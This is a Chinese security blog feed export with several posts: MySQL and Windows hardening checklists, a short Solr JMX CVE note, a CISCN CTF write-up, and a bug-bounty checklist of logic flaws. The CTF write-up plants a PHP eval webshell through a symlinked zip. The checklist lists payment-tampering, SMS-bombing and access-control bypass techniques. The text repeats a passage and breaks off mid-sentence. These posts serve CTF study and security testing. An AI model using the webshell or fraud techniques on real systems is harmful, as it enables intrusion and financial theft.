title="（三）操作系统应遵循最小安装的原则，仅安装需要的组件和应用程序，并通过设置升级服务器等方式保持系统补丁及时得到更新"></a>（三）操作系统应遵循最小安装的原则，仅安装需要的组件和应用程序，并通过设置升级服务器等方式保持系统补丁及时得到更新</h3><ul><li>预期结果：1)系统安装的组件和应用程序遵循了最小安装的原则；2)不必要的服务没有启动。</li><li>评估操作示例：service –status-all | grep running。</li><li>检查情况：</li><li>结果：</li><li>整改建议：对不必要的服务进行关闭，仅保留系统所需要的最小服务。</li></ul><h2 id="四、其他内容"><a href="#四、其他内容" class="headerlink" title="四、其他内容"></a>四、其他内容</h2><h3 id="（一）限制单个用户允许的连接数量"><a href="#（一）限制单个用户允许的连接数量" class="headerlink" title="（一）限制单个用户允许的连接数量"></a>（一）限制单个用户允许的连接数量</h3><ul><li>预期结果：对单个用户的连接数的最大值做出限制，my.cnf 中的 max_user_connections 系统变量为非零值。</li><li>评估操作示例：MySQL&gt;show global variables like ‘%connect%’。</li><li>检查情况：</li><li>结果：</li><li>整改建议：根据系统的实际承受能力，限制单个用户连接数，在&#x2F;etc&#x2F;my.cnf 中进行限制。</li></ul><h3 id="（二）服务监听端口"><a href="#（二）服务监听端口" class="headerlink" title="（二）服务监听端口"></a>（二）服务监听端口</h3><ul><li>预期结果：修改 mysql 默认监听端口 3306 为其他端口。</li><li>评估操作示例：show global variables like ‘port’;看一下监听端口是不是 3306。</li><li>检查情况：</li><li>结果：</li><li>整改建议：vim my.cnf 文件，修改其中的 port 参数为非 3306 且未被占用的端口。</li></ul><h3 id="（三）登录终端超时锁定"><a href="#（三）登录终端超时锁定" class="headerlink" title="（三）登录终端超时锁定"></a>（三）登录终端超时锁定</h3><ul><li>预期结果：设置了超时时间，在时间内没有操作，再次操作时就会提示超时。</li><li>评估操作示例：MYSQL&gt;show VARIABLES like ‘%timeout%’;或访谈了解防火墙等其他安全设备是否做了相关策略。</li><li>检查情况：</li><li>结果：</li><li>整改建议：设置 interactive_timeout 为 300 秒。Mysql&gt; set global interactive_timeout&#x3D;300;</li></ul><h1 id="防火墙策略调研表"><a href="#防火墙策略调研表" class="headerlink" title="防火墙策略调研表"></a>防火墙策略调研表</h1><p><strong>防火墙策略调研表</strong></p><table><thead><tr><th>表名</th><th>设备名称</th><th>所属位置</th><th>设备用途</th><th>部署模式（是否有设备心跳信息）</th><th>本设备IP</th><th>管理端IP</th><th>备注</th></tr></thead><tbody><tr><td>表1.防火墙策略调研表</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>表2.允许放通的业务信息调研表</td><td>开放的业务</td><td>源IP</td><td>业务端口</td><td>对那些IP开放</td><td></td><td></td><td></td></tr><tr><td>表3.与其他业务系统互通的调研表</td><td>需要访问的业务</td><td>源IP</td><td>目的IP</td><td>目的端口</td><td></td><td></td><td></td></tr></tbody></table><p><strong>防火墙策略配置表</strong></p><table><thead><tr><th>编号</th><th>源IP</th><th>目的IP</th><th>源端口</th><th>目的端口</th><th>协议类型</th><th>网卡接口</th><th>包流向</th><th>动作</th></tr></thead><tbody><tr><td>1</td><td>*</td><td>*</td><td>*</td><td>80</td><td>TCP</td><td>*</td><td>出</td><td>允许</td></tr></tbody></table><h1 id="Windows标准检查表a"><a href="#Windows标准检查表a" class="headerlink" title="Windows标准检查表a"></a>Windows标准检查表a</h1><p>一、身份鉴别</p><ol><li><strong>应对登录操作系统和数据库系统的用户进行身份标识和鉴别</strong><ul><li>预期结果：操作系统使用口令鉴别机制对用户进行身份标识和鉴别，且不存在密码为空的用户。</li><li>评估操作示例：访谈管理员，并查看登录过程中系统账户是否使用了密码进行登录验证。</li><li>检查情况：</li><li>结果：操作系统和数据库每个用户都必须设置登录用户名和登录密码，不能存在空密码。</li><li>整改建议：</li></ul></li><li><strong>操作系统和数据库系统管理用户身份标识应具有不易被冒用的特点，口令应有复杂度要求并定期更换</strong><ul><li>预期结果：密码启用复杂度要求；密码最小长度为8位；密码最短使用期限为1天；密码最长使用期限90天；强制密码历史为0个；用可还原的加密来储存密码已禁用。</li><li>评估操作示例：cmd&gt;secpol.msc&gt;账户策略&gt;密码策略。</li><li>检查情况：</li><li>结果：密码启用复杂度要求；密码最小长度为8位；密码最短使用期限为1天；密码最长使用期限90天；强制密码历史为0个；用可还原的加密来储存密码已禁用。</li><li>整改建议：</li></ul></li><li><strong>应启用登录失败处理功能，可采取结束会话、限制非法登录次数和自动退出等措施</strong><ul><li>预期结果：账户锁定时间10分钟；账户锁定阈值5次；重置账户锁定计数器10分钟后。</li><li>评估操作示例：cmd&gt;secpol.msc&gt;账户策略&gt;账户锁定策略。</li><li>检查情况：</li><li>结果：账户锁定时间10分钟；账户锁定阈值5次；重置账户锁定计数器10分钟后。</li><li>整改建议：</li></ul></li><li><strong>当对服务器进行远程管理时，应采取必要措施，防止鉴别信息在网络传输过程中被窃听</strong><ul><li>预期结果：客户端和服务器之间发送数据受加密保护，加密级别根据实际情况来判断，尽量符合FIPS标准。</li><li>评估操作示例：cmd&gt;control&gt;管理工具&gt;终端服务配置&gt;连接&gt;RDP - Tcp&gt;右键属性&gt;加密级别。</li><li>检查情况：</li><li>结果：cmd&gt;control&gt;管理工具&gt;终端服务配置&gt;连接&gt;RDP - Tcp&gt;右键属性&gt;加密级别，选择尽量高级别的加密。</li><li>整改建议：</li></ul></li><li><strong>为操作系统和数据库的不同用户分配不同的用户名，确保用户名具有唯一性</strong><ul><li>预期结果：不存在重复的用户名。</li><li>评估操作示例：cmd&gt;lusrmgr.msc查看“用户”中是否存在重复的用户名。</li><li>检查情况：</li><li>结果：对重复的用户名进行修改。</li><li>整改建议：</li></ul></li><li><strong>应采用两种或两种以上组合的鉴别技术对管理用户进行身份鉴别</strong><ul><li>预期结果：对管理员访谈，对于三级系统，必须使用两种或两种以上组合的鉴别技术实现用户身份鉴别，如密码和口令的组合使用。</li><li>评估操作示例：访谈管理员。</li><li>检查情况：</li><li>结果：三级系统建议采用用户名密码 + 证书口令登录的方式；三级以下系统可以采用一种鉴别技术。</li><li>整改建议：</li></ul></li></ol><p>二、访问控制</p><ol><li><strong>是否开启默认共享</strong><ul><li>预期结果：没有共享文件夹。</li><li>评估操作示例：cmd&gt;fsmgmt.msc，查看共享目录下面的文件夹的内容。</li><li>检查情况：</li><li>结果：关闭默认共享，cmd&gt;fsmgmt.msc，点击共享，右键选择停止共享。</li><li>整改建议：</li></ul></li><li><strong>是否禁止ipc$空连接进行枚举</strong><ul><li>预期结果：restrictanonymous &#x3D; 1。</li><li>评估操作示例：cmd&gt;regedit&gt;HKEY_LOCAL_MACHINE&gt;SYSTEM&gt;CurrentControlSet&gt;Control&gt;LSA，找到LSA中的restrictanonymous值是否等于1。</li><li>检查情况：</li><li>结果：按照上述步骤，在注册表中修改restrictanonymous的值。</li><li>整改建议：</li></ul></li><li><strong>应实现操作系统和数据库系统特权用户的权限分离</strong><ul><li>预期结果：操作系统和数据库的特权用户的权限必须分离，避免一些特权用户拥有过大的权限，减少人为误操作。</li><li>评估操作示例：访谈管理员。</li><li>检查情况：</li><li>结果：分离数据库和操作系统的特权用户，不能使一个用户权限过大。</li><li>整改建议：</li></ul></li><li><strong>应严格限制默认帐户的访问权限，重命名系统默认帐户，修改这些帐户的默认口令</strong><ul><li>预期结果：管理员账户已更改名称，禁用了guest（来宾）账号。</li><li>评估操作示例：cmd&gt;lusrmgr.msc&gt;用户，管理员账号是否改名（默认为administrator），guest账户是否被禁用。</li><li>检查情况：</li><li>结果：cmd&gt;lusrmgr.msc&gt;用户，可以修改管理员账号名称和禁用guest账户。</li><li>整改建议：</li></ul></li><li><strong>应及时删除多余的、过期的帐户</strong><ul><li>预期结果：不存在多余、过期账户。</li><li>评估操作示例：cmd&gt;lusrmgr.msc&gt;用户。</li><li>检查情况：</li><li>结果：cmd&gt;lusrmgr.msc&gt;用户，删除一些与设备运行、维护等工作无关的账号。</li><li>整改建议：</li></ul></li></ol><p>三、安全审计</p><ol><li><strong>审计内容应包括重要用户行为、系统资源的异常使用和重要系统命令的使用等系统内重要的安全相关事件</strong><ul><li>预期结果：审计功能已开启，包括：审核策略更改、审核登录事件、审核对象访问、审核过程跟踪、审核目录服务访问、审核特权使用、审核系统事件、审核帐户登录事件、审核帐户管理等设置。</li><li>评估操作示例：cmd&gt;secpol.msc&gt;本地策略&gt;审核策略。</li><li>检查情况：</li><li>结果：cmd&gt;secpol.msc&gt;本地策略&gt;审核策略，设置为成功或失败。</li><li>整改建议：</li></ul></li><li><strong>日志记录应包括事件的日期、时间、类型、主体标识、客体标识和结果等</strong><ul><li>预期结果：日志记录包括事件的日期、时间、类型、主体标识、客体标识和结果等内容。</li><li>评估操作示例：cmd&gt;eventvwr&gt;系统，查看其中的系统日志详细信息。</li><li>检查情况：</li><li>结果：</li><li>整改建议：</li></ul></li><li><strong>日志记录缓存的大小和达到上限后的覆盖规则</strong><ul><li>预期结果：日志存储上限为20480kb，达到存储上限后按需要覆盖事件。</li><li>评估操作示例：cmd&gt;eventvwr&gt;系统&gt;右键属性。</li><li>检查情况：</li><li>结果：cmd&gt;eventvwr&gt;Windows日志&gt;系统&gt;右键属性，可自己调整日志记录规则和日志缓存大小。</li><li>整改建议：</li></ul></li></ol><p>四、入侵防范</p><ol><li><strong>设置升级服务器等方式保持系统补丁及时得到更新</strong><ul><li>预期结果：已经更新到最近的补丁版本。</li><li>评估操作示例：cmd&gt;control&gt;添加删除程序&gt;记录系统补丁号。</li><li>检查情况：</li><li>结果：及时更新最新的系统补丁。</li><li>整改建议：</li></ul></li><li><strong>系统是否已经开启服务中一些不必要的服务</strong><ul><li>预期结果：未开启一些不必要的服务（如Alerter，Remote Registry Service，Messenger，Task Scheduler等）。</li><li>评估操作示例：cmd&gt;services.msc，查看正在运行的服务。</li><li>检查情况：</li><li>结果：cmd&gt;services.msc，对一些不必要的服务进行关闭。</li><li>整改建议：</li></ul></li></ol><p>五、资源控制</p><ol><li><strong>应根据安全策略设置登录终端的操作超时锁定</strong><ul><li>预期结果：应设置空闲的终端服务会话设置时间限制300秒。</li><li>评估操作示例：cmd&gt;gpedit.msc&gt;计算机配置&gt;管理模板&gt;Windows组件&gt;终端服务&gt;。</li><li>检查情况：</li><li>结果：超时时间建议设置为300秒。</li><li>整改建议：</li></ul></li><li><strong>应根据安全策略限制终端连接的数量</strong><ul><li>预期结果：根据系统实际情况，建议限制终端连接数量为5个。</li><li>评估操作示例：cmd&gt;gpedit.msc&gt;计算机配置&gt;管理模板&gt;Windows组件&gt;终端服务&gt;。</li><li>检查情况：</li><li>结果：限制终端连接数量为5个，避免造成系统资源占用过多。</li><li>整改建议：</li></ul></li></ol><p>六、剩余信息保护</p><ol><li><strong>应保证操作系统和数据库管理系统用户的鉴别信息所在的存储空间，被释放或再分配给其他用户前得到完全清除，无论这些信息是存放在硬盘上还是在内存中</strong><ul><li>预期结果：在登录系统时不显示上次的用户登录名。</li><li>评估操作示例：cmd&gt;secpol.msc&gt;本地策略&gt;安全选项&gt;交互式登录不显示上次的用户名是否禁用。</li><li>检查情况：</li><li>结果：cmd&gt;secpol.msc&gt;本地策略&gt;安全选项&gt;交互式登录不显示上次的用户名，右键属性选择启用。</li><li>整改建议：</li></ul></li><li><strong>应确保系统内的文件、目录和数据库记录等资源所在的存储空间，被释放或重新分配给其他用户前得到完全清除</strong><ul><li>预期结果：系统启用关机前清除虚拟内存页面。</li><li>评估操作示例：cmd&gt;secpol.msc&gt;本地策略&gt;安全选项&gt;关机：清除虚拟内存页面文件。</li><li>检查情况：</li><li>结果：cmd&gt;secpol.msc&gt;本地策略&gt;安全选项&gt;关机：清除虚拟内存页面文件，右键属性选择开启。</li><li>整改建议：</li></ul></li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 基线检查 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基线检查 </tag>
            
            <tag> IDS </tag>
            
            <tag> 安全审计 </tag>
            
            <tag> 网络设备防护 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>solr 代码执行 (CVE-2019-12409)</title>
      <link href="/2024/11/13/solr%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20(CVE-2019-12409)/"/>
      <url>/2024/11/13/solr%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20(CVE-2019-12409)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>Java ManagementExtensions（JMX）是一种Java技术，为管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。JMX 作为 Java的一种Bean管理机制，如果JMX服务端口暴露，那么远程攻击者可以让该服务器远程加载恶意的Bean文件，随着Bean的滥用导致远程代码执行。</p><p><a href="/../assets/img/image-74.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-74.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN Web unzip writeup</title>
      <link href="/2024/11/13/2024-08-07-CISCN-Web-Unzip/"/>
      <url>/2024/11/13/2024-08-07-CISCN-Web-Unzip/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="CISCN-Web-unzip-writeup"><a href="#CISCN-Web-unzip-writeup" class="headerlink" title="CISCN Web unzip writeup"></a>CISCN Web unzip writeup</h2><h3 id="0x01-题目描述"><a href="#0x01-题目描述" class="headerlink" title="0x01 题目描述"></a>0x01 题目描述</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//only this! </span></span><br></pre></td></tr></table></figure><p><code>ln -s var/www/html link</code></p><p><code>zip --symlinks link.zip link</code></p><p>删除文件link</p><p>新建目录link<br><code>mkdir link</code></p><p><code>cd link</code></p><p><code>cat shell.php</code></p><?php eval($_REQUEST[1]);phpinfo();?><p><code>cd ..</code></p><p><code>zip -r demo.zip link/</code></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> CTF </tag>
            
            <tag> WebSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code_dev</title>
      <link href="/2024/11/13/2024-08-05-code-dev/"/>
      <url>/2024/11/13/2024-08-05-code-dev/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>1 、身份认证安全<br>1.1、暴力破解<br>在没有验证码限制或者一次验证码可以多次使用的地方，使用已知用户对密码进行暴力破解或者用一个通用密码对用户进行暴力破解。简单的验证码爆破。</p><p>1.2、session &amp; cookie类<br>会话固定攻击:利用服务器的session不变机制，借他人之手获得认证和授权，冒充他人。</p><p>Cookie仿冒:修改cookie中的某个参数可以登录其他用户。</p><p>1.3、弱加密<br>未使用https，是功能测试点，不好利用。</p><p>前端加密，用密文去后台校验，并利用smart decode可解</p><p>2、业务一致性安全<br>2.1、手机号篡改<br>抓包修改手机号码参数为其他号码尝试，例如在办理查询页面，输入自己的号码然后抓包，修改手机号码参数为其他人号码，查看是否能查询其他人的业务。</p><p>2.2、邮箱或者用户篡改<br>抓包修改用户或者邮箱参数为其他用户或者邮箱</p><p>2.3、订单id篡改<br>查看自己的订单id，然后修改id(加减一)查看是否能查看其他订单信息。</p><p>2.4、商品编号篡改<br>例如积分兑换处，100个积分只能换商品编号为001,1000个积分只能换商品编号005,在100积分换商品的时候抓包把换商品的编号修改为005，用低积分换取高积分商品</p><p>2.5、用户id篡改<br>抓包查看自己的用户id，然后修改id(加减1)查看是否能查看其他用户id信息。</p><p>3、业务数据篡改<br>3.1、金额数据篡改<br>抓包修改金额等字段，例如在支付页面抓取请求中商品的金额字段，修改成任意数据的金额并提交，查看能否以修改后的金额数据完成业务流程。</p><p>3.2、商品数量篡改<br>抓包修改商品数量等子段，将请求中的商品数量修改成任意数额，如负数并提交，查看能否以修改后的数量完成业务流程。</p><p>3.3、最大数限制突破<br>很多商品限制用户购买数量时，服务器仅在页面通过js脚本限制，未在服务器端校验用户提交的数量，通过抓包修改商品最大数限制，将请求中的商品数量改为大于最大数限制的值，查看能否以修改后的数量完成业务流程。</p><p>3.4、本地js参数修改<br>部分应用程序通过Javascript处理用户提交的请求，通过修改Javascript脚本，测试修改后的数据是否影响到用户。</p><p>4、密码找回漏洞<br>密码找回逻辑测试一般流程</p><p>i.首先尝试正常密码找回流程，选择不同找回方式，记录所有数据包</p><p>ii.分析数据包，找到敏感部分</p><p>iii.分析后台找回机制所采用的验证手段</p><p>iv.修改数据包验证推测</p><p>5、验证码突破<br>验证码不单单在登录、找密码应用，提交敏感数据的地方也有类似应用，故单独分类，并进一步详情说明。</p><p>5.1、验证码暴力破解测试<br>使用burp对特定的验证码进行暴力破解</p><p>5.2、验证码时间、次数测试<br>抓取携带验证码的数据包不断重复提交，例如:在投诉建议处输入要投诉的内容信息，及验证码参数，此时抓包重复提交数据包，查看历史投诉中是否存在重复提交的参数信息。</p><p>5.3、验证码客户端回显测试<br>当客户端有需要和服务器进行交互，发送验证码时，即可使用firefox按F12调出firebuf就可看到客户端与服务器进行交互的详细信息</p><p>5.4、验证码绕过测试<br>当第一步向第二步跳转时，抓取数包，对验证码进行篡改清空测试，验证该步骤验证码是否可以绕过。</p><p>5.5、验证码js绕过<br>短信验证码验证程序逻辑存在缺陷，业务流程的第一步、第二步，第三步都是放在同一个页面里，验证第一步验证码是通过js来判断的，可以修改验证码在没有获取验证码的情况下可以填写实名信息，并且提交成功。</p><p>6、业务授权安全<br>6.1、未授权访问<br>非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息。可以尝试在登录某网站前台或后台之后，将相关的页面链接复制于其他浏览器或其他电脑上进行访问，看是否能访问成功。</p><p>6.2、越权访问<br>水平越权</p><p>即用户A和用户B属于同一个权限组，水平越权就是用户A可以看到用户B才可以看到的一些内容。一个简单的例子，就是保单管理系统中，每个人都只可以看到自己的保单，如果出现用户A可以查看到用户B的保单的现象，此时就发生了水平越权。</p><p>垂直越权</p><p>即用户A和用户B属于不同的权限组，如用户A属于普通用户权限组，而用户B属于管理员权限组，垂直越权就是用户A可以看到用户B才可以看到的内容。一个简单的例子，用户A可以看到通讯录界面，用户B可以看到通讯录和用户管理的界面（其中用户管理界面可以看到用户密码）。如果用户A修改一下请求的URL即可以看到作为管理员才可已看到的全部用户密码，此时就发生了垂直越权。</p><p>检测思路</p><p>出现越权访问漏洞的主要原因，是因为开发人员只是在前端界面进行了简单的菜单隐藏，而没有用统一的服务端拦截器&#x2F;中间件对于全部URL请求进行权限判断。这样，攻击者只需要在浏览器或者BurpSuite之类的攻击工具中，发出对于指定URL的请求，即可以实现对于特定接口的越权访问。</p><p>如果将用户A与他所属的权限组&#x2F;不同权限组用户群体的惯常访问URL合集进行比对，可以发现有些URL是多个用户都会访问的，而有的URL（或者请求中含有的特定的参数）是各个用户访问时都存在差异的。这类具有差异性的URL即为敏感URL。</p><p>当用户A访问了不在惯常访问URL合集内的URL，且此URL为敏感URL，即可以判定为发生了越权访问。</p><p>7、业务流程乱序<br>7.1、顺序执行缺陷<br>a) 部分网站逻辑可能是先A过程后B过程然后C过程最后D过程</p><p>b) 用户控制着他们给应用程序发送的每一个请求，因此能够按照任何顺序进行访问。于是，用户就从B直接进入了D过程，就绕过了C。如果C是支付过程，那么用户就绕过了支付过程而买到了一件商品。如果C是验证过程，就会绕过验证直接进入网站程序了。</p><p>8、业务接口调用安全<br>8.1、重放攻击<br>在短信、邮件调用业务或生成业务数据环节中(类:短信验证码，邮件验证码，订单生成，评论提交等),对其业务环节进行调用(重放)测试。如果业务经过调用(重放)后被多次生成有效的业务或数据结果。</p><p>a) 恶意注册</p><p>b) 短信</p><p>在测试的过程中，我们发现众多的金融交易平台仅在前端通过JS校验时间来控制短信发送按钮，但后台并未对发送做任何限制，导致可通过重放包的方式大量发送恶意短信</p><p>8.2、内容编辑<br>点击”获取短信验证码”,并抓取数据包内容。通过分析数据包，可以发现参数sendData&#x2F;insrotext的内容有客户端控制，可以修改为攻击者想要发送的内容</p><p>9、时效绕过测试<br>大多有利用的案例发生在验证码以及业务数据的时效范围上，在之前的总结也有人将12306的作为典型，故，单独分类。</p><p>9.1、时间刷新缺陷<br>12306网站的买票业务是每隔5s，票会刷新一次。但是这个时间确实在本地设置的间隔。于是，在控制台就可以将这个时间的关联变量重新设置成1s或者更小，这样刷新的时间就会大幅度缩短(主要更改autoSearchTime本地参数)。</p><p>9.2、时间范围测试<br>针对某些带有时间限制的业务，修改其时间限制范围，例如在某项时间限制范围内查询的业务，修改含有时间明文字段的请求并提交，查看能否绕过时间限制完成业务流程。例如通过更改查询手机网厅的受理记录的month范围，可以突破默认只能查询六个月的记录。</p><p>新设置成1s或者更小，这样刷新的时间就会大幅度缩短(主要更改autoSearchTime本地参数)。</p><p>9.2、时间范围测试<br>针对某些带有时间限制的业务，修改其时间限制范围，例如在某项时间限制范围内查询的业务，修改含有时间明文字段的请求并提交，查看能否绕过时间限制完成业务流程。例如通过更改查询手机网厅的受理记录的month范围，可以突破默认只能查询六个月的记录。</p><h3 id="SRC中的逻辑漏洞总结"><a href="#SRC中的逻辑漏洞总结" class="headerlink" title="SRC中的逻辑漏洞总结"></a>SRC中的逻辑漏洞总结</h3><ol><li><p>注册：</p><ol><li>短信轰炸</li><li>验证码安全问题</li><li>密码爆破</li><li>邮箱轰炸</li></ol></li><li><p>用户任意注册、批量注册</p></li><li><p>用户名枚举</p></li><li><p>XSS（有框的地方就可以尝试插XSS）</p></li><li><p>登录：</p><ol><li>短信轰炸、验证码安全问题、密码爆破、邮箱轰炸</li><li>SQL注入</li><li>撞库</li><li>抓包把password字段修改为空值发送</li><li>认证凭证替换、比如返回的数据包中包含账号，修改账号就能登录到其他账号</li><li>Cookie仿冒</li><li>修改返回包的相关数据，可能会登陆到其他的用户</li></ol></li><li><p>找回密码：</p><ol><li>短信邮箱轰炸、短信邮箱劫持</li><li>重置任意用户账户密码、验证码手机用户未统一验证</li><li>直接跳过验证步骤</li></ol></li><li><p>购买支付、充值（要利用抓包去仔细查看每一个可用的参数）</p><ol><li>交易金额、数量修改、更换支付模块（比如更换支付的模块金额）</li><li>交易信息订单编码&#x2F;导致信息泄露</li><li>整数溢出，int最大值为2147483647，超过最大值</li><li>修改充值账户</li><li>支付绕过</li></ol></li><li><p>抽奖活动</p><ol><li>刷奖品、积分</li><li>并发</li></ol></li><li><p>优惠卷、代金卷</p><ol><li>并发逻辑漏洞（burp批量获取优惠券）</li><li>修改优惠券金额、数量</li></ol></li><li><p>订单信息</p><ol><li>订单信息遍历、泄露</li><li>订单信息泄露导致用户信息泄露</li><li>删出他人订单</li></ol></li><li><p>会员系统</p><ol><li>修改个人信息上传文件，上传带弹窗的html</li><li>如遇上上传xlsx、docx，可能存在XXE，上传恶意的文档盲测</li><li>图片上传也可能遇到imagereagick命令执行，上传恶意图片</li><li>视频上传如果使用ffmpeg&lt;3.2.4（视频按帧分割成图片），上传恶意avi盲测ssrf</li><li>用户横向越权访问、遍历、导致用户信息泄露</li><li>SQL注入、个人简历处存储XSS个人信息注册的名称也可以插入XSS</li></ol></li><li><p>传输过程</p><ol><li>明文传输账户密码</li><li>修改信息处无session&#x2F;token导致csrf</li><li>POST&#x2F;COOKIE注入</li></ol></li><li><p>评论</p><ol><li>POST注入</li><li>存储型XSS</li><li>无session&#x2F;token导致CSRF</li></ol></li><li><p>验证码问题</p><ol><li>万能验证码</li><li>返回包中存在验证码</li><li>删除验证码或者cookie中的值可以爆破账号密码</li></ol></li><li><p>短信轰炸</p><ol><li>一直重放</li><li>删除修改cookie，重放数据包</li><li>遍历参数发送数据包</li><li>手机号后面加空格或者前面加其他的比如+86或者逗号分号等，然后重发数据包</li><li>请求参数修改大小写，或者添加请求参数比如&amp;id&#x3D;1</li><li>一个站的登录处可能做了防护，但是再找回密码处可能没有安全防护，或者在注册流程中没有安全防护，所以说多测试接口</li><li>如果对手机号一天的次数进行了限制，还可以再发一次短信，DO intercept之后修改为成功回显</li></ol></li><li><p>水平越权</p><ol><li>主要登陆后还是修改参数，主要找到多个接口不断测试</li><li>关注网页源代码，有时候会有表单，但被bidden（隐藏标签）给隐藏起来了，可以修改返回包然后尝试获取数据检测</li><li>多个账号，主要分析请求参数</li></ol></li><li><p>数据泄露</p><ol><li>再找回密码处，填写数据后抓包查看返回信息，有可能存在敏感数据返回</li></ol></li><li><p>任意用户密码重置</p><ol><li>目前大部分都是在修改密码处参数修改</li><li>有些是前端验证</li></ol></li></ol><p>支付逻辑漏洞</p><ol><li>边界值问题 : 正常的逻辑是用户购买商品，然后价格累加得到一个总价进行扣款。这个时候就会产生逻辑问题：如果说用户购买的商品是负数了，那么计算的总数就是负数。反过来钱给用户</li><li>顺序执行缺陷：正常的逻辑是a-b-c-d 循环渐进的进行流程操作。这个时候就会产生逻辑问题：可以直接从中绕过某一个过程进入到下一步操作。如果说有一项是支付的操作，那么也就会产生支付绕过，如果说有一项是验证机制，就会绕过验证直接进入下一步。</li><li>金额直接传输导致篡改：直接对下单的金额进行修改值，这里可以使用fd或者burp抓包</li><li>确定支付之后还可以加入购物车：把商品放入购物车点击下单支付，会跳转到微信，支付宝等第三方支付平台。这个时候还可以继续在购物车中加入商品，支付结束之后，商家发放的商品是现在的购物车里面的东西。</li><li>请求重放：购买成功之后，继续重放请求，可以让购买的商品一直增加。购买成功之后，会有一个银行对商户网站跳转的过程，如果反复进行操作，有几率会导致商品反复购买和增加，但是不需要付更多的钱。</li><li>请求参数干扰：金钱做了签名认证之后，修改后不通过，但是在里面仍然会有一个参数对金额产生影响导致问题产生。</li><li>订单替换：订单替换发生在支付之后的事件处理，同时向服务器发起二次支付请求一个多一个少，支付金额少的，然后支付之后进行替换，告知服务器订单支付完成，并且过程可以反复的回放。</li><li>欺诈:需要两个收款人，一个是正常的商家，一个是伪造的商家</li><li>单位替换：产生在paypal类似的国际支付的场景。</li><li>用户替换：在支付过程中发生用户替换现象，首先登陆自己的账户，然后取得另外一个人的账户名等有效信息，在业务流程中用对方的用户名替换自己的用户名，用对方的余额购买完成后，再替换自己的账户名，这样就形成别人的钱买自己的东西</li><li>强制攻击：强制攻击发生在暴力破解的情况下，如果一个商家运用一个自己的网店，接入第三方支付接口，由于设计上的不当导致商家与第三方支付约定的密钥Key可以单独被MD5加密，导致可以使用MD5碰撞技术对密钥进行破解，攻击者可以设计简单的密钥加密信息使得MD5加密是可以用MD5碰撞技术进行暴力破解。</li><li>秘钥泄漏：内置支付功能的app为了设计上的方便有可能会把Md5或者是RSA的私钥泄漏导致攻击者反编译apk之后获取密钥信息使得交易信息可以被篡改。</li><li>函数修改：apk反编译之后的函数修改，可能导致商家在最后一步向支付方提交订单时未验证信息的准确性，仍然被篡改。</li><li>heart bleed：SSL（安全套接层）协议是使用最为普遍网站加密技术，而OpenSSL则是开源的 SSL 套件，为全球成千上万的web服务器所使用。Web服务器正是通过它来将密钥发送给访客然后在双方的连接之间对信息进行加密。URL中使用 